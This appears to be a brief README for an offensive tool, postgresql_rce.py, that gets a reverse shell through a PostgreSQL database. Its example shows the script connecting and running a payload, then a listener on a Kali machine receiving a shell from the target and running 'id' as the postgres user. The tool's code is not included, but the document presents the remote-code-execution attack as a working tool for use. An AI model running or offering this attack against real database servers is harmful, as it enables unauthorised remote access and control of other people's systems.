# PostgreSQL_RCE
Get a reverse shell using PostgreSQL

Example:

# python3 postgresql_rce.py                                                                               
[!] Connected to the PostgreSQL database
[*] Executing the payload. Please check if you got a reverse shell!



#### On your Kali machine
listening on [any] 80 ...
connect to [192.168.49.56] from (UNKNOWN) [192.168.56.47] 56810
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
$ 
